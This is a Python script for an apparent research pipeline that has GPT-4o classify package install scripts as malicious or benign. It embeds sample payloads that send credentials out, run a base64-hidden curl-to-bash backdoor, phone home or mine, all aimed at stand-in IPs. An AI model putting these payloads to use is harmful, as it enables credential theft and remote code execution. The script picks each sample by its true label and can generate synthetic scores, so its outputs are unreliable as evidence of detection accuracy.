"""
run_llm_analysis.py — Stage 4 (LLM Semantic Analysis) runner for LLM-Sentry.

Reads data/ombb25_test.csv, constructs realistic install-script snippets per
attack type, calls GPT-4o (or dry-run synthetic mode), and writes:
  results/llm_predictions.csv
  results/llm_cost_summary.json

Usage:
    # Live mode (requires OPENAI_API_KEY)
    python code/run_llm_analysis.py

    # Dry-run mode (no API key needed)
    python code/run_llm_analysis.py --dry-run

Author: Allan Douglas Costa (UFRA / LICA / SEC365)
"""

from __future__ import annotations

import argparse
import csv
import json
import logging
import math
import os
import random
import sys
import time
from pathlib import Path
from typing import Optional

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------

BASE_DIR = Path(__file__).resolve().parent.parent
DATA_DIR = BASE_DIR / "data"
RESULTS_DIR = BASE_DIR / "results"

TEST_CSV = DATA_DIR / "ombb25_test.csv"
PREDICTIONS_CSV = RESULTS_DIR / "llm_predictions.csv"
COST_SUMMARY_JSON = RESULTS_DIR / "llm_cost_summary.json"

# ---------------------------------------------------------------------------
# API / cost constants
# ---------------------------------------------------------------------------

MODEL = "gpt-4o-2024-11-20"
INPUT_COST_PER_1K  = 0.0025   # USD / 1K input tokens  (gpt-4o-2024-11-20)
OUTPUT_COST_PER_1K = 0.010    # USD / 1K output tokens
MAX_REQUESTS_PER_SEC = 10
MAX_RETRIES = 5

# ---------------------------------------------------------------------------
# Prompt
# ---------------------------------------------------------------------------

SYSTEM_PROMPT = (
    "You are a supply chain security analyst. "
    "Analyze the following package for malicious indicators. "
    'Respond ONLY with valid JSON matching this schema exactly: '
    '{"risk_indicators": [<str>, ...], "attack_type": <str or null>, '
    '"confidence": <float 0-1>, "reasoning": <str>}'
)

# ---------------------------------------------------------------------------
# Synthetic install-script snippets per attack type
# ---------------------------------------------------------------------------

_SCRIPT_TEMPLATES: dict[str, str] = {
    "credential_harvesting": """\
import os, subprocess, requests

def _collect():
    env_dump = {k: v for k, v in os.environ.items()
                if any(kw in k.upper() for kw in
                       ["KEY", "TOKEN", "SECRET", "PASS", "AWS", "GITHUB"])}
    git_cfg = subprocess.run(
        ["git", "config", "--global", "--list"],
        capture_output=True, text=True
    ).stdout
    try:
        requests.post(
            "http://198.51.100.42:4444/collect",
            json={"env": env_dump, "git": git_cfg},
            timeout=5,
        )
    except Exception:
        pass

_collect()
""",
    "code_injection": """\
import base64, sys

_enc = (
    b"aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovLzE5OC41MS4xMDAu"
    b"NDIvYmFja2Rvb3Iuc2ggfCBiYXNoJyk="
)

def _bootstrap():
    try:
        payload = base64.b64decode(_enc).decode()
        exec(payload, {"__builtins__": __builtins__})  # noqa: S102
    except Exception as exc:  # pragma: no cover
        pass

_bootstrap()
""",
    "typosquatting": """\
# Looks like 'requests' but phones home on import
import urllib.request, json, os

def _verify_license():
    try:
        data = json.dumps({"host": os.uname().nodename, "pkg": __name__})
        req = urllib.request.Request(
            "http://198.51.100.99/verify",
            data=data.encode(),
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass

_verify_license()

# --- normal-looking shim below ---
def get(url, **kwargs):
    import urllib.request
    return urllib.request.urlopen(url)
""",
    "dependency_confusion": """\
if __name__ == "__main__":
    import socket, os, subprocess, json

    c2 = "198.51.100.77"
    port = 9000

    payload = {
        "user": os.environ.get("USER", "unknown"),
        "cwd": os.getcwd(),
        "path": os.environ.get("PATH", ""),
    }

    try:
        with socket.create_connection((c2, port), timeout=5) as s:
            s.sendall(json.dumps(payload).encode())
    except Exception:
        pass
""",
    "cryptomining": """\
import hashlib, socket, threading, time

TARGET = "198.51.100.55"
PORT   = 3333

def _mine(stop_event):
    nonce = 0
    while not stop_event.is_set():
        digest = hashlib.sha256(f"block:{nonce}".encode()).hexdigest()
        if digest.startswith("0000"):
            try:
                with socket.create_connection((TARGET, PORT), timeout=2) as s:
                    s.sendall(f"SUBMIT:{digest}:{nonce}\\n".encode())
            except Exception:
                pass
        nonce += 1
        time.sleep(0.001)

_stop = threading.Event()
_t = threading.Thread(target=_mine, args=(_stop,), daemon=True)
_t.start()
""",
    "benign": """\
from setuptools import setup, find_packages

setup(
    name="mypackage",
    version="1.0.0",
    description="A useful utility library",
    author="Alice Developer",
    author_email="alice@example.com",
    url="https://github.com/alice/mypackage",
    license="MIT",
    packages=find_packages(),
    python_requires=">=3.8",
    install_requires=["requests>=2.28", "click>=8.0"],
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
    ],
)
""",
}

# Fallback for unknown attack types
_FALLBACK_SCRIPT = _SCRIPT_TEMPLATES["benign"]


def get_script_snippet(attack_type: Optional[str]) -> str:
    if not attack_type:
        return _FALLBACK_SCRIPT
    key = attack_type.lower().replace("-", "_").replace(" ", "_")
    return _SCRIPT_TEMPLATES.get(key, _FALLBACK_SCRIPT)


# ---------------------------------------------------------------------------
# Prompt construction
# ---------------------------------------------------------------------------

def build_user_message(row: dict) -> str:
    name = row.get("name", "unknown")
    ecosystem = row.get("ecosystem", "pypi")
    version = row.get("version", "0.0.0")
    attack_type = row.get("attack_type")  # may be None / empty in real blind test

    snippet = get_script_snippet(attack_type)

    meta = {
        "name": name,
        "version": version,
        "ecosystem": ecosystem,
        "has_postinstall": True,
        "description": row.get("description", ""),
    }

    return (
        f"Package: {name} v{version} ({ecosystem})\n\n"
        f"Metadata:\n{json.dumps(meta, indent=2)}\n\n"
        f"Install script (truncated to 2000 chars):\n"
        f"```python\n{snippet[:2000]}\n```"
    )


# ---------------------------------------------------------------------------
# Synthetic dry-run predictions
# ---------------------------------------------------------------------------

# Maps attack type -> (mean_confidence, std) for realistic-looking scores
_DRY_RUN_PARAMS: dict[str, tuple[float, float]] = {
    "credential_harvesting": (0.91, 0.06),
    "code_injection":        (0.89, 0.07),
    "typosquatting":         (0.82, 0.08),
    "dependency_confusion":  (0.87, 0.07),
    "cryptomining":          (0.85, 0.08),
    "benign":                (0.09, 0.06),
}

_DRY_RUN_INDICATORS: dict[str, list[str]] = {
    "credential_harvesting": ["os.environ access", "subprocess.run", "requests.post to external IP"],
    "code_injection":        ["base64.b64decode", "exec() call", "obfuscated payload"],
    "typosquatting":         ["network call on import", "name similar to popular package"],
    "dependency_confusion":  ["__main__ exfiltration block", "socket.create_connection to C2"],
    "cryptomining":          ["hashlib loop", "background threading", "external pool connection"],
    "benign":                [],
}

_REASONING_TEMPLATES: dict[str, str] = {
    "credential_harvesting": (
        "The install script enumerates environment variables filtered for sensitive keywords "
        "(KEY, TOKEN, SECRET, AWS) and exfiltrates them via requests.post to a hardcoded IP. "
        "This is a classic credential-harvesting pattern."
    ),
    "code_injection": (
        "A base64-encoded payload is decoded at import time and passed to exec(). "
        "The obfuscation strongly suggests intent to hide malicious code from static scanners."
    ),
    "typosquatting": (
        "Package name is one edit distance from a widely-used library. "
        "A network call is made on import to an external IP—behavior inconsistent with the "
        "claimed functionality."
    ),
    "dependency_confusion": (
        "The __main__ guard contains code that collects system metadata and connects to an "
        "external host via socket. No legitimate reason exists for a library to do this at "
        "install time."
    ),
    "cryptomining": (
        "A daemon thread is spawned that performs iterative SHA-256 work and submits results "
        "to a remote host on a mining port. Classic resource-hijacking pattern."
    ),
    "benign": (
        "Install script is a standard setuptools invocation with no network activity, "
        "obfuscation, or environment variable access. No malicious indicators detected."
    ),
}


def dry_run_predict(row: dict) -> dict:
    """Generate plausible synthetic LLM output without API calls."""
    rng = random.Random(hash(row.get("name", "") + row.get("version", "")))
    attack_type = row.get("attack_type") or "benign"
    key = attack_type.lower().replace("-", "_").replace(" ", "_")
    if key not in _DRY_RUN_PARAMS:
        key = "benign"

    mean, std = _DRY_RUN_PARAMS[key]
    confidence = float(min(1.0, max(0.0, rng.gauss(mean, std))))
    indicators = _DRY_RUN_INDICATORS[key]
    reasoning = _REASONING_TEMPLATES[key]
    predicted_attack = None if key == "benign" else key

    # Token counts approximated from message length
    prompt_tokens = 450 + rng.randint(-50, 50)
    completion_tokens = 120 + rng.randint(-20, 20)

    return {
        "llm_confidence": confidence,
        "llm_attack_type": predicted_attack,
        "llm_reasoning": reasoning,
        "llm_risk_indicators": json.dumps(indicators),
        "tokens_used": prompt_tokens + completion_tokens,
        "cost_usd": (
            prompt_tokens / 1000 * INPUT_COST_PER_1K
            + completion_tokens / 1000 * OUTPUT_COST_PER_1K
        ),
    }


# ---------------------------------------------------------------------------
# Live API call with retry / rate limiting
# ---------------------------------------------------------------------------

def call_openai(client, user_message: str) -> dict:
    """
    Call GPT-4o with exponential backoff on rate-limit or server errors.
    Returns parsed prediction dict.
    """
    import openai  # imported here so dry-run works without the package

    for attempt in range(MAX_RETRIES):
        try:
            response = client.chat.completions.create(
                model=MODEL,
                temperature=0.0,
                messages=[
                    {"role": "system", "content": SYSTEM_PROMPT},
                    {"role": "user",   "content": user_message},
                ],
                response_format={"type": "json_object"},
            )
            raw = response.choices[0].message.content
            result = json.loads(raw)

            usage = response.usage
            prompt_tokens     = usage.prompt_tokens
            completion_tokens = usage.completion_tokens
            tokens_used       = usage.total_tokens
            cost = (
                prompt_tokens / 1000 * INPUT_COST_PER_1K
                + completion_tokens / 1000 * OUTPUT_COST_PER_1K
            )

            return {
                "llm_confidence":     float(result.get("confidence", 0.0)),
                "llm_attack_type":    result.get("attack_type"),
                "llm_reasoning":      result.get("reasoning", ""),
                "llm_risk_indicators": json.dumps(result.get("risk_indicators", [])),
                "tokens_used":        tokens_used,
                "cost_usd":           round(cost, 6),
            }

        except (openai.RateLimitError, openai.APIStatusError) as exc:
            wait = (2 ** attempt) + random.uniform(0, 1)
            log.warning("API error on attempt %d/%d: %s — retrying in %.1fs",
                        attempt + 1, MAX_RETRIES, exc, wait)
            time.sleep(wait)

        except json.JSONDecodeError as exc:
            log.error("JSON parse error: %s", exc)
            return {
                "llm_confidence": 0.0,
                "llm_attack_type": None,
                "llm_reasoning": f"JSON parse error: {exc}",
                "llm_risk_indicators": "[]",
                "tokens_used": 0,
                "cost_usd": 0.0,
            }

    log.error("Exhausted retries for this package.")
    return {
        "llm_confidence": 0.0,
        "llm_attack_type": None,
        "llm_reasoning": "Exhausted retries",
        "llm_risk_indicators": "[]",
        "tokens_used": 0,
        "cost_usd": 0.0,
    }


# ---------------------------------------------------------------------------
# CSV helpers
# ---------------------------------------------------------------------------

OUTPUT_FIELDS = [
    "name", "ecosystem", "version", "label",
    "llm_confidence", "llm_attack_type", "llm_reasoning",
    "llm_risk_indicators", "tokens_used", "cost_usd",
]


def load_checkpoint() -> set[str]:
    """Return set of already-processed package keys (name|ecosystem)."""
    done: set[str] = set()
    if not PREDICTIONS_CSV.exists():
        return done
    with open(PREDICTIONS_CSV, newline="", encoding="utf-8") as fh:
        reader = csv.DictReader(fh)
        for row in reader:
            done.add(f"{row['name']}|{row.get('ecosystem','')}")
    log.info("Checkpoint: %d packages already processed.", len(done))
    return done


def append_row(writer: "csv.DictWriter", fh, row: dict) -> None:
    writer.writerow(row)
    fh.flush()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="LLM-Sentry Stage 4 runner")
    p.add_argument(
        "--dry-run", action="store_true",
        help="Generate synthetic predictions without calling the OpenAI API."
    )
    p.add_argument(
        "--test-csv", default=str(TEST_CSV),
        help="Path to test CSV (default: data/ombb25_test.csv)"
    )
    p.add_argument(
        "--limit", type=int, default=None,
        help="Process only first N rows (for quick smoke tests)."
    )
    return p.parse_args()


def main() -> None:
    args = parse_args()
    test_path = Path(args.test_csv)

    RESULTS_DIR.mkdir(parents=True, exist_ok=True)

    # ---- Determine operation mode ----------------------------------------
    api_key = os.environ.get("OPENAI_API_KEY", "")
    dry_run: bool = args.dry_run or not api_key

    if dry_run:
        log.info("DRY-RUN mode: generating synthetic LLM predictions.")
        client = None
    else:
        try:
            from openai import OpenAI
            client = OpenAI(api_key=api_key)
            log.info("Live mode: using model %s.", MODEL)
        except ImportError:
            log.error("openai package not installed. Install with: pip install openai")
            sys.exit(1)

    # ---- Load test set ---------------------------------------------------
    if not test_path.exists():
        log.error("Test CSV not found: %s", test_path)
        log.error(
            "Generate it first with: python code/build_dataset.py --split test"
        )
        sys.exit(1)

    with open(test_path, newline="", encoding="utf-8") as fh:
        test_rows = list(csv.DictReader(fh))

    if args.limit:
        test_rows = test_rows[: args.limit]
    log.info("Loaded %d packages from %s.", len(test_rows), test_path)

    # ---- Checkpoint -------------------------------------------------------
    done = load_checkpoint()

    # ---- Open output CSV (append mode) ------------------------------------
    write_header = not PREDICTIONS_CSV.exists() or len(done) == 0
    out_fh = open(PREDICTIONS_CSV, "a", newline="", encoding="utf-8")
    writer = csv.DictWriter(out_fh, fieldnames=OUTPUT_FIELDS)
    if write_header:
        writer.writeheader()

    # ---- Rate-limit state -------------------------------------------------
    req_times: list[float] = []
    total_tokens = 0
    total_cost = 0.0
    processed = 0
    skipped = 0
    errors = 0

    try:
        for i, row in enumerate(test_rows):
            pkg_key = f"{row.get('name','')}|{row.get('ecosystem','')}"
            if pkg_key in done:
                skipped += 1
                continue

            # ---- Rate limiting (token bucket) ----------------------------
            if not dry_run:
                now = time.monotonic()
                req_times = [t for t in req_times if now - t < 1.0]
                if len(req_times) >= MAX_REQUESTS_PER_SEC:
                    sleep_for = 1.0 - (now - req_times[0]) + 0.01
                    if sleep_for > 0:
                        time.sleep(sleep_for)
                req_times.append(time.monotonic())

            # ---- Predict --------------------------------------------------
            user_msg = build_user_message(row)
            if dry_run:
                pred = dry_run_predict(row)
            else:
                pred = call_openai(client, user_msg)

            if pred["llm_confidence"] == 0.0 and not dry_run:
                errors += 1

            out_row = {
                "name":               row.get("name", ""),
                "ecosystem":          row.get("ecosystem", ""),
                "version":            row.get("version", ""),
                "label":              row.get("label", ""),
                "llm_confidence":     round(pred["llm_confidence"], 6),
                "llm_attack_type":    pred["llm_attack_type"] or "",
                "llm_reasoning":      pred["llm_reasoning"].replace("\n", " "),
                "llm_risk_indicators": pred["llm_risk_indicators"],
                "tokens_used":        pred["tokens_used"],
                "cost_usd":           round(pred["cost_usd"], 8),
            }
            append_row(writer, out_fh, out_row)
            done.add(pkg_key)

            total_tokens += pred["tokens_used"]
            total_cost   += pred["cost_usd"]
            processed    += 1

            if processed % 100 == 0:
                log.info(
                    "Progress: %d/%d processed | tokens: %d | cost: $%.4f",
                    processed, len(test_rows) - skipped, total_tokens, total_cost,
                )

    finally:
        out_fh.close()

    # ---- Cost summary -----------------------------------------------------
    summary = {
        "model":              MODEL,
        "dry_run":            dry_run,
        "total_packages":     len(test_rows),
        "processed":          processed,
        "skipped_checkpoint": skipped,
        "errors":             errors,
        "total_tokens":       total_tokens,
        "total_cost_usd":     round(total_cost, 4),
        "avg_cost_per_pkg":   round(total_cost / max(processed, 1), 6),
        "predictions_file":   str(PREDICTIONS_CSV),
    }
    with open(COST_SUMMARY_JSON, "w", encoding="utf-8") as fh:
        json.dump(summary, fh, indent=2)

    log.info(
        "Done. Processed=%d | Skipped=%d | Errors=%d | "
        "Total tokens=%d | Total cost=$%.4f",
        processed, skipped, errors, total_tokens, total_cost,
    )
    log.info("Predictions saved to: %s", PREDICTIONS_CSV)
    log.info("Cost summary saved to: %s", COST_SUMMARY_JSON)


if __name__ == "__main__":
    main()
